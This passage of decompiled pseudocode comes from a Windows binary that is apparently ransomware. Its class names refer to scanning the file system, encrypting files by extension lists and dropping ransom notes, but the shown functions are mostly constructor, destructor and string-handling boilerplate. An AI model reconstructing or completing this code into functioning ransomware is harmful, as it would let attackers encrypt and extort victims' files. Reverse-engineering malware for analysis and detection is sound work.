  v4[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v4[1] = *(_DWORD *)a2;
  v5 = *(_BYTE *)(a2 + 4);
  v6 = *(_DWORD *)(a2 + 8);
  v7 = v4;
  sub_412DF0(v4, (int)this);
  if ( v7 )
    (*(void (__stdcall **)(bool))(*v7 + 16))(v7 != v4);
  return this;
}
// 4B15D0: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00414590) --------------------------------------------------------
int __thiscall sub_414590(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventInitFileProcess `RTTI Type Descriptor',
           1);
}

//----- (00414610) --------------------------------------------------------
int __thiscall sub_414610(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventCryptFile `RTTI Type Descriptor', 1);
}

//----- (00414690) --------------------------------------------------------
int __thiscall sub_414690(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventGetID `RTTI Type Descriptor', 1);
}

//----- (00414710) --------------------------------------------------------
void ***sub_414710()
{
  return &std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &> `RTTI Type Descriptor';
}
// 4FE488: using guessed type void **std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &> `RTTI Type Descriptor';

//----- (00414720) --------------------------------------------------------
int __thiscall sub_414720(int this, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)a2 = &std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_DWORD *)(a2 + 12) = *(_DWORD *)(this + 12);
  return result;
}
// 4B15D0: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileProcessModule::*)(ANIEvent &&),ANFileProcessModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00414750) --------------------------------------------------------
_DWORD *__fastcall sub_414750(_DWORD *a1, int a2)
{
  _WORD *v3; // edx
  WCHAR *p_Src; // ecx
  const WCHAR *v5; // eax
  DWORD EnvironmentVariableW; // ecx
  __int128 *v7; // eax
  __int128 *v8; // ecx
  __int128 v9; // xmm0
  __int128 Src; // [esp+14h] [ebp-28h] BYREF
  DWORD nSize[2]; // [esp+24h] [ebp-18h]
  int v14; // [esp+38h] [ebp-4h]

  if ( *(_DWORD *)(a2 + 16) )
  {
    v3 = sub_404910(0x108u);
    nSize[0] = 260;
    nSize[1] = 263;
    memset(v3, 0, 0x208u);
    v3[260] = 0;
    LODWORD(Src) = v3;
    v14 = 0;
    p_Src = (WCHAR *)&Src;
    v5 = (const WCHAR *)a2;
    if ( nSize[1] >= 8 )
      p_Src = v3;
    if ( *(_DWORD *)(a2 + 20) >= 8u )
      v5 = *(const WCHAR **)a2;
    EnvironmentVariableW = GetEnvironmentVariableW(v5, p_Src, nSize[0]);
    if ( EnvironmentVariableW )
    {
      if ( EnvironmentVariableW > nSize[0] )
      {
        sub_405640(&Src, EnvironmentVariableW - nSize[0], 0);
      }
      else
      {
        v7 = &Src;
        nSize[0] = EnvironmentVariableW;
        if ( nSize[1] >= 8 )
          v7 = (__int128 *)Src;
        *((_WORD *)v7 + EnvironmentVariableW) = 0;
      }
    }
    else
    {
      v8 = &Src;
      nSize[0] = 0;
      if ( nSize[1] >= 8 )
        v8 = (__int128 *)Src;
      *(_WORD *)v8 = 0;
    }
    v9 = Src;
    a1[4] = 0;
    a1[5] = 0;
    *(_OWORD *)a1 = v9;
    *((_QWORD *)a1 + 2) = *(_QWORD *)nSize;
  }
  else
  {
    a1[4] = 0;
    a1[5] = 7;
    *(_WORD *)a1 = 0;
    sub_404330(a1, (void *)&psz, 0);
  }
  return a1;
}

//----- (004148A0) --------------------------------------------------------
_DWORD *__fastcall sub_4148A0(_DWORD *a1, unsigned __int16 *a2)
{
  unsigned __int16 *v2; // edi
  int v4; // edx
  unsigned __int16 *v5; // ecx
  unsigned int v6; // ecx
  unsigned int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // edx
  __int128 v10; // xmm0
  _DWORD *result; // eax
  __int128 v12; // [esp+10h] [ebp-20h] BYREF
  __int64 v13; // [esp+20h] [ebp-10h]

  v2 = a2;
  v4 = *((_DWORD *)a2 + 4);
  if ( !v4 )
    goto LABEL_11;
  v5 = v2;
  if ( *((_DWORD *)v2 + 5) >= 8u )
    v5 = *(unsigned __int16 **)v2;
  v6 = sub_40A9C0(v5, v4, (int)v5, (__int16 *)".", 1);
  if ( v6 == -1 )
  {
LABEL_11:
    a1[4] = 0;
    a1[5] = 7;
    *(_WORD *)a1 = 0;
    sub_404330(a1, (void *)&psz, 0);
    return a1;
  }
  else
  {
    v13 = 0x700000000i64;
    LOWORD(v12) = 0;
    v7 = *((_DWORD *)v2 + 4);
    if ( v7 < v6 )
      sub_404630();
    v8 = v7 - v6;
    v9 = -1;
    if ( v8 != -1 )
      v9 = v8;
    if ( *((_DWORD *)v2 + 5) >= 8u )
      v2 = *(unsigned __int16 **)v2;
    sub_404330(&v12, &v2[v6], v9);
    v10 = v12;
    a1[4] = 0;
    result = a1;
    a1[5] = 0;
    *(_OWORD *)a1 = v10;
    *((_QWORD *)a1 + 2) = v13;
  }
  return result;
}
// 404630: using guessed type void __noreturn sub_404630(void);

//----- (00414980) --------------------------------------------------------
int __thiscall sub_414980(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  *this = &ANEventScanFileSystem::`vftable';
  v2 = this[9];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[4];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1630: using guessed type void *ANEventScanFileSystem::`vftable';

//----- (004149F0) --------------------------------------------------------
_DWORD *__thiscall sub_4149F0(_DWORD *Block, char a2)
{
  sub_414980(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00414A20) --------------------------------------------------------
_DWORD *__thiscall sub_414A20(_DWORD *this, int a2, _DWORD *Block, int a4, int a5, int a6, int a7, unsigned int a8)
{
  _BYTE *v9; // ecx

  this[1] = 0;
  this[2] = a2;
  this[3] = 5;
  *this = &ANEventScanFileSystemAsync::`vftable';
  sub_4055B0(this + 4, &Block);
  if ( a8 >= 8 )
  {
    v9 = Block;
    if ( 2 * a8 + 2 >= 0x1000 )
    {
      v9 = (_BYTE *)*(Block - 1);
      if ( (unsigned int)((char *)Block - v9 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v9);
  }
  return this;
}
// 4B1680: using guessed type void *ANEventScanFileSystemAsync::`vftable';

//----- (00414B40) --------------------------------------------------------
_DWORD *__thiscall sub_414B40(_DWORD *Block, char a2)
{
  unsigned int v3; // ecx
  _DWORD *v4; // eax

  *Block = &ANEventScanFileSystemAsync::`vftable';
  v3 = Block[9];
  if ( v3 >= 8 )
  {
    v4 = (_DWORD *)Block[4];
    if ( 2 * v3 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_44775B(v4);
  }
  Block[8] = 0;
  Block[9] = 7;
  *((_WORD *)Block + 8) = 0;
  *Block = &ANIEvent::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1680: using guessed type void *ANEventScanFileSystemAsync::`vftable';

//----- (00414BC0) --------------------------------------------------------
int __thiscall sub_414BC0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  *this = &ANEventDropNote::`vftable';
  v2 = this[9];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[4];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B169C: using guessed type void *ANEventDropNote::`vftable';

//----- (00414C30) --------------------------------------------------------
_DWORD *__thiscall sub_414C30(_DWORD *Block, char a2)
{
  sub_414BC0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00414C60) --------------------------------------------------------
_DWORD *__thiscall sub_414C60(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 2;
  this[3] = 12;
  *this = &ANEventGetEncryptExtensionsIgnore::`vftable';
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  return result;
}
// 4B1638: using guessed type void *ANEventGetEncryptExtensionsIgnore::`vftable';

//----- (00414CA0) --------------------------------------------------------
void __thiscall sub_414CA0(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  *this = &ANEventGetEncryptExtensionsIgnore::`vftable';
  v2 = this[4];
  if ( v2 )
  {
    sub_4047B0(v2, this[5]);
    v3 = (_DWORD *)this[4];
    if ( (unsigned int)(24 * ((this[6] - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1638: using guessed type void *ANEventGetEncryptExtensionsIgnore::`vftable';

//----- (00414D30) --------------------------------------------------------
_DWORD *__thiscall sub_414D30(_DWORD *Block, char a2)
{
  sub_414CA0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00414D60) --------------------------------------------------------
_DWORD *__thiscall sub_414D60(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 2;
  this[3] = 13;
  *this = &ANEventGetEncryptExtensionsFull::`vftable';
  this[4] = 0;
  this[5] = 0;
  this[6] = 0;
  return result;
}
// 4B161C: using guessed type void *ANEventGetEncryptExtensionsFull::`vftable';

//----- (00414DA0) --------------------------------------------------------
void __thiscall sub_414DA0(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  *this = &ANEventGetEncryptExtensionsFull::`vftable';
  v2 = this[4];
  if ( v2 )
  {
    sub_4047B0(v2, this[5]);
    v3 = (_DWORD *)this[4];
    if ( (unsigned int)(24 * ((this[6] - (int)v3) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
    this[4] = 0;
    this[5] = 0;
    this[6] = 0;
  }
  *this = &ANIEvent::`vftable';
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B161C: using guessed type void *ANEventGetEncryptExtensionsFull::`vftable';

//----- (00414E30) --------------------------------------------------------
_DWORD *__thiscall sub_414E30(_DWORD *Block, char a2)
{
  sub_414DA0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00414E60) --------------------------------------------------------
_DWORD *__thiscall sub_414E60(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  this[1] = 0;
  *((_WORD *)this + 8) = 0;
  result = this;
  this[2] = 2;
  this[3] = 19;
  *this = &ANEventGetNoteName::`vftable';
  this[8] = 0;
  this[9] = 7;
  return result;
}
// 4B165C: using guessed type void *ANEventGetNoteName::`vftable';

//----- (00414EA0) --------------------------------------------------------
int __thiscall sub_414EA0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  *this = &ANEventGetNoteName::`vftable';
  v2 = this[9];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[4];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B165C: using guessed type void *ANEventGetNoteName::`vftable';

//----- (00414F10) --------------------------------------------------------
_DWORD *__thiscall sub_414F10(_DWORD *Block, char a2)
{
  sub_414EA0(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00414F40) --------------------------------------------------------
int __thiscall sub_414F40(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  *this = &ANEventCryptFile::`vftable';
  v2 = this[9];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[4];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  result = 0;
  this[8] = 0;
  this[9] = 7;
  *((_WORD *)this + 8) = 0;
  *this = &ANIEvent::`vftable';
  return result;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1614: using guessed type void *ANEventCryptFile::`vftable';

//----- (00414FB0) --------------------------------------------------------
_DWORD *__thiscall sub_414FB0(_DWORD *Block, char a2)
{
  sub_414F40(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00414FE0) --------------------------------------------------------
_DWORD *__fastcall sub_414FE0(int a1, int a2, int a3, volatile signed __int32 *a4)
{
  int *v5; // edi
  _DWORD *v6; // esi
  int v7; // eax
  char *v8; // ecx
  unsigned int v9; // edx
  _QWORD *v10; // eax
  __int128 v11; // xmm0
  __int64 v12; // xmm1_8
  int v13; // eax
  unsigned int v14; // edx
  void *v15; // ecx
  void *v16; // ecx
  void *v17; // ecx
  void *v18; // ecx
  _DWORD *v19; // esi
  int v20; // eax
  char *v21; // ecx
  unsigned int v22; // edx
  _QWORD *v23; // eax
  __int128 v24; // xmm0
  __int64 v25; // xmm1_8
  int v26; // eax
  unsigned int v27; // edx
  void *v28; // ecx
  void *v29; // ecx
  void *v30; // ecx
  void *v31; // ecx
  _DWORD *v32; // esi
  int v33; // eax
  char *v34; // ecx
  unsigned int v35; // edx
  _QWORD *v36; // eax
  __int128 v37; // xmm0
  __int64 v38; // xmm1_8
  int v39; // eax
  unsigned int v40; // edx
  void *v41; // ecx
  void *v42; // ecx
  void *v43; // ecx
  void *v44; // ecx
  int v45; // eax
  _DWORD *v46; // eax
  int v47; // ecx
  void *v48; // ecx
  void *v49; // ecx
  int v50; // eax
  _DWORD *v51; // eax
  int v52; // ecx
  void *v53; // ecx
  void *v54; // ecx
  int v55; // eax
  _DWORD *v56; // eax
  int v57; // ecx
  void *v58; // ecx
  void *v59; // ecx
  _DWORD *v60; // esi
  int v61; // eax
  char *v62; // ecx
  unsigned int v63; // edx
  _QWORD *v64; // eax
  __int128 v65; // xmm0
  __int64 v66; // xmm1_8
  int v67; // eax
  unsigned int v68; // edx
  void *v69; // ecx
  void *v70; // ecx
  void *v71; // ecx
  void *v72; // ecx
  int v73; // eax
  _DWORD *v74; // eax
  int v75; // ecx
  void *v76; // ecx
  void *v77; // ecx
  int v78; // eax
  _DWORD *v79; // eax
  int v80; // ecx
  void *v81; // ecx
  void *v82; // ecx
  int v83; // eax
  int v84; // ecx
  void *v85; // ecx
  int v86; // eax
  int v87; // ecx
  void *v88; // ecx
  int v89; // eax
  int v90; // ecx
  void *v91; // ecx
  int v92; // eax
  int v93; // ecx
  void *v94; // ecx
  int v95; // eax
  int v96; // ecx
  void *v97; // ecx
  _DWORD *v98; // esi
  int v99; // eax
  char *v100; // ecx
  unsigned int v101; // edx
  _QWORD *v102; // eax
  __int128 v103; // xmm0
  __int64 v104; // xmm1_8
  _DWORD *v105; // eax
  int v106; // ecx
  unsigned int v107; // edx
  void *v108; // ecx
  void *v109; // ecx
  void *v110; // ecx
  void *v111; // ecx
  _DWORD *v112; // esi
  int v113; // eax
  char *v114; // ecx
  unsigned int v115; // edx
  _QWORD *v116; // eax
  __int128 v117; // xmm0
  __int64 v118; // xmm1_8
  _DWORD *v119; // eax
  int v120; // ecx
  unsigned int v121; // edx
  void *v122; // ecx
  void *v123; // ecx
  void *v124; // esi
  int v125; // eax
  char *v126; // eax
  int v127; // eax
  void *v128; // esi
  int v129; // eax
  char *v130; // eax
  int v131; // eax
  _DWORD *v132; // esi
  int v133; // ecx
  _DWORD *v134; // esi
  int v135; // ecx
  int v136; // ecx
  int v137; // ecx
  int v138; // ecx
  int v139; // ecx
  int v140; // ecx
  int v141; // ecx
  void *v143[4]; // [esp+10h] [ebp-100h] BYREF
  int v144; // [esp+20h] [ebp-F0h]
  unsigned int v145; // [esp+24h] [ebp-ECh]
  _DWORD *v146; // [esp+28h] [ebp-E8h]
  void *v147[5]; // [esp+2Ch] [ebp-E4h] BYREF
  unsigned int v148; // [esp+40h] [ebp-D0h]
  void *Block[4]; // [esp+44h] [ebp-CCh] BYREF
  __int64 v150; // [esp+54h] [ebp-BCh]
  void *v151[4]; // [esp+5Ch] [ebp-B4h] BYREF
  int v152; // [esp+6Ch] [ebp-A4h]
  unsigned int v153; // [esp+70h] [ebp-A0h]
  int v154; // [esp+74h] [ebp-9Ch]
  _DWORD v155[4]; // [esp+78h] [ebp-98h] BYREF
  void *v156; // [esp+88h] [ebp-88h] BYREF
  _DWORD v157[4]; // [esp+A0h] [ebp-70h] BYREF
  void *v158; // [esp+B0h] [ebp-60h] BYREF
  _DWORD v159[4]; // [esp+C8h] [ebp-48h] BYREF
  unsigned int *v160; // [esp+D8h] [ebp-38h] BYREF
  _DWORD v161[4]; // [esp+E4h] [ebp-2Ch] BYREF
  unsigned int *v162; // [esp+F4h] [ebp-1Ch] BYREF
  int v163; // [esp+10Ch] [ebp-4h]
  int savedregs; // [esp+110h] [ebp+0h] BYREF

  v146 = (_DWORD *)a1;
  v154 = a1;
  v163 = 0;
  if ( a4 )
    _InterlockedIncrement(a4 + 1);
  sub_40F700((_DWORD *)a1, a3, a4, 5);
  *(_DWORD *)a1 = &ANFileSystemScannerModule::`vftable';
  *(_DWORD *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  v5 = (int *)(a1 + 36);
  *(_DWORD *)(a1 + 36) = 0;
  *(_DWORD *)(a1 + 40) = 0;
  *(_DWORD *)(a1 + 44) = 0;
  *(_DWORD *)(a1 + 48) = 0;
  *(_DWORD *)(a1 + 52) = 0;
  *(_DWORD *)(a1 + 56) = 0;
  *(_DWORD *)(a1 + 60) = 0;
  *(_DWORD *)(a1 + 64) = 0;
  *(_DWORD *)(a1 + 68) = 0;
  *(_DWORD *)(a1 + 72) = 0;
  *(_DWORD *)(a1 + 76) = 0;
  *(_DWORD *)(a1 + 80) = 0;
  *(_DWORD *)(a1 + 100) = 0;
  *(_DWORD *)(a1 + 104) = 7;
  *(_WORD *)(a1 + 84) = 0;
  *(_DWORD *)(a1 + 124) = 0;
  *(_DWORD *)(a1 + 128) = 7;
  *(_WORD *)(a1 + 108) = 0;
  LOBYTE(v163) = 8;
  v6 = (_DWORD *)sub_40C780(&dword_4F9A78, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 9;
  v7 = sub_40C780(&dword_4F9988, (int)v151, (int)&savedregs);
  LOBYTE(v163) = 10;
  v8 = (char *)sub_414750(v143, v7);
  LOBYTE(v163) = 11;
  v9 = v6[4];
  v154 = *((_DWORD *)v8 + 4);
  if ( v9 <= *((_DWORD *)v8 + 5) - v154 || v6[5] - v9 < v154 )
  {
    if ( v6[5] >= 8u )
      v6 = (_DWORD *)*v6;
    v10 = sub_4044A0(v8, v6, v9);
  }
  else
  {
    if ( *((_DWORD *)v8 + 5) >= 8u )
      v8 = *(char **)v8;
    v10 = sub_40B080((char **)v6, (int)v8, v8, v154);
  }
  v11 = *(_OWORD *)v10;
  v12 = v10[2];
  *(_WORD *)v10 = 0;
  *((_DWORD *)v10 + 5) = 7;
  *((_DWORD *)v10 + 4) = 0;
  v150 = v12;
  *(_OWORD *)Block = v11;
  LOBYTE(v163) = 12;
  v13 = v5[1];
  if ( v13 == v5[2] )
  {
    sub_404640(v5, v13, (int)Block);
    v14 = HIDWORD(v150);
  }
  else
  {
    *(_OWORD *)v13 = v11;
    v14 = 7;
    *(_QWORD *)(v13 + 16) = v12;
    v5[1] += 24;
    LOWORD(Block[0]) = 0;
  }
  LOBYTE(v163) = 11;
  if ( v14 >= 8 )
  {
    v15 = Block[0];
    if ( 2 * v14 + 2 >= 0x1000 )
    {
      v15 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v15 - 4) > 0x1F )
        goto LABEL_248;
    }
    sub_44775B(v15);
  }
  LOBYTE(v163) = 10;
  if ( v145 >= 8 )
  {
    v16 = v143[0];
    if ( 2 * v145 + 2 >= 0x1000 )
    {
      v16 = (void *)*((_DWORD *)v143[0] - 1);
      if ( (unsigned int)(v143[0] - v16 - 4) > 0x1F )
        goto LABEL_248;
    }
    sub_44775B(v16);
  }
  LOBYTE(v163) = 9;
  v144 = 0;
  v145 = 7;
  LOWORD(v143[0]) = 0;
  if ( v153 >= 8 )
  {
    v17 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v17 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v17 - 4) > 0x1F )
        goto LABEL_248;
    }
    sub_44775B(v17);
  }
  LOBYTE(v163) = 8;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v148 >= 8 )
  {
    v18 = v147[0];
    if ( 2 * v148 + 2 < 0x1000 || (v18 = (void *)*((_DWORD *)v147[0] - 1), (unsigned int)(v147[0] - v18 - 4) <= 0x1F) )
    {
      sub_44775B(v18);
      goto LABEL_30;
    }
LABEL_248:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_30:
  v19 = (_DWORD *)sub_40C780(&dword_4F9AF0, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 13;
  v20 = sub_40C780(&dword_4F9988, (int)v143, (int)&savedregs);
  LOBYTE(v163) = 14;
  v21 = (char *)sub_414750(v151, v20);
  LOBYTE(v163) = 15;
  v22 = v19[4];
  v154 = *((_DWORD *)v21 + 4);
  if ( v22 <= *((_DWORD *)v21 + 5) - v154 || v19[5] - v22 < v154 )
  {
    if ( v19[5] >= 8u )
      v19 = (_DWORD *)*v19;
    v23 = sub_4044A0(v21, v19, v22);
  }
  else
  {
    if ( *((_DWORD *)v21 + 5) >= 8u )
      v21 = *(char **)v21;
    v23 = sub_40B080((char **)v19, (int)v21, v21, v154);
  }
  v24 = *(_OWORD *)v23;
  v25 = v23[2];
  *(_WORD *)v23 = 0;
  *((_DWORD *)v23 + 5) = 7;
  *((_DWORD *)v23 + 4) = 0;
  v150 = v25;
  *(_OWORD *)Block = v24;
  LOBYTE(v163) = 16;
  v26 = v5[1];
  if ( v26 == v5[2] )
  {
    sub_404640(v5, v26, (int)Block);
    v27 = HIDWORD(v150);
  }
  else
  {
    *(_OWORD *)v26 = v24;
    v27 = 7;
    *(_QWORD *)(v26 + 16) = v25;
    v5[1] += 24;
    LOWORD(Block[0]) = 0;
  }
  LOBYTE(v163) = 15;
  if ( v27 >= 8 )
  {
    v28 = Block[0];
    if ( 2 * v27 + 2 >= 0x1000 )
    {
      v28 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v28 - 4) > 0x1F )
        goto LABEL_249;
    }
    sub_44775B(v28);
  }
  LOBYTE(v163) = 14;
  if ( v153 >= 8 )
  {
    v29 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v29 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v29 - 4) > 0x1F )
        goto LABEL_249;
    }
    sub_44775B(v29);
  }
  LOBYTE(v163) = 13;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v145 >= 8 )
  {
    v30 = v143[0];
    if ( 2 * v145 + 2 >= 0x1000 )
    {
      v30 = (void *)*((_DWORD *)v143[0] - 1);
      if ( (unsigned int)(v143[0] - v30 - 4) > 0x1F )
        goto LABEL_249;
    }
    sub_44775B(v30);
  }
  LOBYTE(v163) = 8;
  v144 = 0;
  v145 = 7;
  LOWORD(v143[0]) = 0;
  if ( v148 >= 8 )
  {
    v31 = v147[0];
    if ( 2 * v148 + 2 < 0x1000 || (v31 = (void *)*((_DWORD *)v147[0] - 1), (unsigned int)(v147[0] - v31 - 4) <= 0x1F) )
    {
      sub_44775B(v31);
      goto LABEL_57;
    }
LABEL_249:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_57:
  v32 = (_DWORD *)sub_40C780(&dword_4F9AC0, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 17;
  v33 = sub_40C780(&dword_4F9988, (int)v143, (int)&savedregs);
  LOBYTE(v163) = 18;
  v34 = (char *)sub_414750(v151, v33);
  LOBYTE(v163) = 19;
  v35 = v32[4];
  v154 = *((_DWORD *)v34 + 4);
  if ( v35 <= *((_DWORD *)v34 + 5) - v154 || v32[5] - v35 < v154 )
  {
    if ( v32[5] >= 8u )
      v32 = (_DWORD *)*v32;
    v36 = sub_4044A0(v34, v32, v35);
  }
  else
  {
    if ( *((_DWORD *)v34 + 5) >= 8u )
      v34 = *(char **)v34;
    v36 = sub_40B080((char **)v32, (int)v34, v34, v154);
  }
  v37 = *(_OWORD *)v36;
  v38 = v36[2];
  *(_WORD *)v36 = 0;
  *((_DWORD *)v36 + 5) = 7;
  *((_DWORD *)v36 + 4) = 0;
  v150 = v38;
  *(_OWORD *)Block = v37;
  LOBYTE(v163) = 20;
  v39 = v5[1];
  if ( v39 == v5[2] )
  {
    sub_404640(v5, v39, (int)Block);
    v40 = HIDWORD(v150);
  }
  else
  {
    *(_OWORD *)v39 = v37;
    v40 = 7;
    *(_QWORD *)(v39 + 16) = v38;
    v5[1] += 24;
    LOWORD(Block[0]) = 0;
  }
  LOBYTE(v163) = 19;
  if ( v40 >= 8 )
  {
    v41 = Block[0];
    if ( 2 * v40 + 2 >= 0x1000 )
    {
      v41 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v41 - 4) > 0x1F )
        goto LABEL_250;
    }
    sub_44775B(v41);
  }
  LOBYTE(v163) = 18;
  if ( v153 >= 8 )
  {
    v42 = v151[0];
    if ( 2 * v153 + 2 >= 0x1000 )
    {
      v42 = (void *)*((_DWORD *)v151[0] - 1);
      if ( (unsigned int)(v151[0] - v42 - 4) > 0x1F )
        goto LABEL_250;
    }
    sub_44775B(v42);
  }
  LOBYTE(v163) = 17;
  v152 = 0;
  v153 = 7;
  LOWORD(v151[0]) = 0;
  if ( v145 >= 8 )
  {
    v43 = v143[0];
    if ( 2 * v145 + 2 >= 0x1000 )
    {
      v43 = (void *)*((_DWORD *)v143[0] - 1);
      if ( (unsigned int)(v143[0] - v43 - 4) > 0x1F )
        goto LABEL_250;
    }
    sub_44775B(v43);
  }
  LOBYTE(v163) = 8;
  v144 = 0;
  v145 = 7;
  LOWORD(v143[0]) = 0;
  if ( v148 < 8 )
    goto LABEL_84;
  v44 = v147[0];
  if ( 2 * v148 + 2 >= 0x1000 )
  {
    v44 = (void *)*((_DWORD *)v147[0] - 1);
    if ( (unsigned int)(v147[0] - v44 - 4) > 0x1F )
LABEL_250:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v44);
LABEL_84:
  v45 = sub_40C780(&dword_4F99B8, (int)v147, (int)&savedregs);
  LOBYTE(v163) = 21;
  v46 = sub_414750(v151, v45);
  LOBYTE(v163) = 22;
  v47 = v5[1];
  if ( v47 == v5[2] )
  {
